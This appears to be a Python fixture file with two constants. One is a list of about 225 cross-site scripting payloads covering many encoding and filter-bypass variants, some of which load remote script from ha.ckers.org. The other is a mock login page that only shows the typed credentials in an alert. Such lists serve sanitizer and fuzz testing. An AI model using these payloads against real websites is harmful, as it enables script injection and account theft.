NAUGHTY_HTML = """<script>alert(0)</script>
&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;
<img src=x onerror=alert(2) />
<svg><script>123<1>alert(3)</script>
"><script>alert(4)</script>
'><script>alert(5)</script>
><script>alert(6)</script>
</script><script>alert(7)</script>
< / script >< script >alert(8)< / script >
 onfocus=JaVaSCript:alert(9) autofocus
" onfocus=JaVaSCript:alert(10) autofocus
' onfocus=JaVaSCript:alert(11) autofocus
＜script＞alert(12)＜/script＞
<sc<script>ript>alert(13)</sc</script>ript>
--><script>alert(14)</script>
";alert(15);t="
';alert(16);t='
JavaSCript:alert(17)
;alert(18);
src=JaVaSCript:prompt(19)
"><script>alert(20);</script x="
'><script>alert(21);</script x='
><script>alert(22);</script x=
" autofocus onkeyup="javascript:alert(23)
' autofocus onkeyup='javascript:alert(24)
<script\x20type="text/javascript">javascript:alert(25);</script>
<script\x3Etype="text/javascript">javascript:alert(26);</script>
<script\x0Dtype="text/javascript">javascript:alert(27);</script>
<script\x09type="text/javascript">javascript:alert(28);</script>
<script\x0Ctype="text/javascript">javascript:alert(29);</script>
<script\x2Ftype="text/javascript">javascript:alert(30);</script>
<script\x0Atype="text/javascript">javascript:alert(31);</script>
'`"><\x3Cscript>javascript:alert(32)</script>
'`"><\x00script>javascript:alert(33)</script>
ABC<div style="x\x3Aexpression(javascript:alert(34)">DEF
ABC<div style="x:expression\x5C(javascript:alert(35)">DEF
ABC<div style="x:expression\x00(javascript:alert(36)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(37)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(38)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(39)">DEF
ABC<div style="x:\x09expression(javascript:alert(40)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(41)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(42)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(43)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(44)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(45)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(46)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(47)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(48)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(49)">DEF
ABC<div style="x:\x20expression(javascript:alert(50)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(51)">DEF
ABC<div style="x:\x00expression(javascript:alert(52)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(53)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(54)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(55)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(56)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(57)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(58)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(59)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(60)">DEF
<a href="\x0Bjavascript:javascript:alert(61)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(62)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(63)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(64)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(65)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(66)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(67)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(68)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(69)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(70)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(71)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(72)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(73)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(74)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(75)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(76)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(77)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(78)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(79)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(80)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(81)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(82)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(83)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(84)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(85)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(86)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(87)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(88)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(89)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(90)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(91)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(92)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(93)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(94)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(95)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(96)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(97)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(98)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(99)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(100)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(101)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(102)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(103)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(104)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(105)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(106)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(107)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(108)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(109)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(110)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(111)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(112)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(113)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(114)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(115)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(116)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(117)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(118)>
`"'><img src=xxx:x \x22onerror=javascript:alert(119)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(120)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(121)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(122)>
`"'><img src=xxx:x \x09onerror=javascript:alert(123)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(124)>
`"'><img src=xxx:x \x00onerror=javascript:alert(125)>
`"'><img src=xxx:x \x27onerror=javascript:alert(126)>
`"'><img src=xxx:x \x20onerror=javascript:alert(127)>
"`'><script>\x3Bjavascript:alert(128)</script>
"`'><script>\x0Djavascript:alert(129)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(130)</script>
"`'><script>\xE2\x80\x81javascript:alert(131)</script>
"`'><script>\xE2\x80\x84javascript:alert(132)</script>
"`'><script>\xE3\x80\x80javascript:alert(133)</script>
"`'><script>\x09javascript:alert(134)</script>
"`'><script>\xE2\x80\x89javascript:alert(135)</script>
"`'><script>\xE2\x80\x85javascript:alert(136)</script>
"`'><script>\xE2\x80\x88javascript:alert(137)</script>
"`'><script>\x00javascript:alert(138)</script>
"`'><script>\xE2\x80\xA8javascript:alert(139)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(140)</script>
"`'><script>\xE1\x9A\x80javascript:alert(141)</script>
"`'><script>\x0Cjavascript:alert(142)</script>
"`'><script>\x2Bjavascript:alert(143)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(144)</script>
"`'><script>-javascript:alert(145)</script>
"`'><script>\x0Ajavascript:alert(146)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(147)</script>
"`'><script>\x7Ejavascript:alert(148)</script>
"`'><script>\xE2\x80\x87javascript:alert(149)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(150)</script>
"`'><script>\xE2\x80\xA9javascript:alert(151)</script>
"`'><script>\xC2\x85javascript:alert(152)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(153)</script>
"`'><script>\xE2\x80\x83javascript:alert(154)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(155)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(156)</script>
"`'><script>\xE2\x80\x80javascript:alert(157)</script>
"`'><script>\x21javascript:alert(158)</script>
"`'><script>\xE2\x80\x82javascript:alert(159)</script>
"`'><script>\xE2\x80\x86javascript:alert(160)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(161)</script>
"`'><script>\x0Bjavascript:alert(162)</script>
"`'><script>\x20javascript:alert(163)</script>
"`'><script>\xC2\xA0javascript:alert(164)</script>
<img \x00src=x onerror="alert(165)">
<img \x47src=x onerror="javascript:alert(166)">
<img \x11src=x onerror="javascript:alert(167)">
<img \x12src=x onerror="javascript:alert(168)">
<img\x47src=x onerror="javascript:alert(169)">
<img\x10src=x onerror="javascript:alert(170)">
<img\x13src=x onerror="javascript:alert(171)">
<img\x32src=x onerror="javascript:alert(172)">
<img\x47src=x onerror="javascript:alert(173)">
<img\x11src=x onerror="javascript:alert(174)">
<img \x47src=x onerror="javascript:alert(175)">
<img \x34src=x onerror="javascript:alert(176)">
<img \x39src=x onerror="javascript:alert(177)">
<img \x00src=x onerror="javascript:alert(178)">
<img src\x09=x onerror="javascript:alert(179)">
<img src\x10=x onerror="javascript:alert(180)">
<img src\x13=x onerror="javascript:alert(181)">
<img src\x32=x onerror="javascript:alert(182)">
<img src\x12=x onerror="javascript:alert(183)">
<img src\x11=x onerror="javascript:alert(184)">
<img src\x00=x onerror="javascript:alert(185)">
<img src\x47=x onerror="javascript:alert(186)">
<img src=x\x09onerror="javascript:alert(187)">
<img src=x\x10onerror="javascript:alert(188)">
<img src=x\x11onerror="javascript:alert(189)">
<img src=x\x12onerror="javascript:alert(190)">
<img src=x\x13onerror="javascript:alert(191)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(192)">
<img src=x onerror=\x09"javascript:alert(193)">
<img src=x onerror=\x10"javascript:alert(194)">
<img src=x onerror=\x11"javascript:alert(195)">
<img src=x onerror=\x12"javascript:alert(196)">
<img src=x onerror=\x32"javascript:alert(197)">
<img src=x onerror=\x00"javascript:alert(198)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(199)>XXX</a>
<img src="x` `<script>javascript:alert(200)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(201)//">
<title onpropertychange=javascript:alert(202)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(203)></a>">
<!--[if]><script>javascript:alert(204)</script -->
<!--[if<img src=x onerror=javascript:alert(205)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<IMG \"\"\"><SCRIPT>alert("206")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(50,48,55))>
<IMG SRC=# onmouseover="alert('208')">
<IMG SRC= onmouseover="alert('209')">
<IMG onmouseover="alert('210')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#50;&#49;&#49;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000050&#0000049&#0000050&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x32&#x31&#x33&#x27&#x29>
<IMG SRC="jav   ascript:alert('214');">
<IMG SRC="jav&#x09;ascript:alert('215');">
<IMG SRC="jav&#x0A;ascript:alert('216');">
<IMG SRC="jav&#x0D;ascript:alert('217');">
perl -e 'print "<IMG SRC=java\0script:alert(\"218\")>";' > out
<IMG SRC=" &#14;  javascript:alert('219');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("220")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("221");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('222')"
<iframe src=http://ha.ckers.org/scriptlet.html <
\";alert('223');//
<u oncopy=alert()> Copy me</u>
<i onwheel=alert(224)> Scroll over me </i>
<plaintext>
http://a/%%30%30
</textarea><script>alert(225)</script>""".split('\n')

#######################################################################################################################################

FAKE_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f4;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    form {
        background-color: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        width: 300px;
    }
    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 10px;
        margin: 8px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
    }
    input[type="submit"] {
        background-color: #4caf50;
        color: white;
        padding: 14px 20px;
        margin: 8px 0;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
    }
    input[type="submit"]:hover {
        background-color: #45a049;
    }
</style>
</head>
<body>

<form id="loginForm" onsubmit="login(event)">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br><br>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br><br>
    <input type="submit" value="Login">
</form>

<script>
    function login(event) {
        event.preventDefault();
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;
        alert("Username: " + username + "\nPassword: " + password);
    }
</script>

</body>
</html>
"""
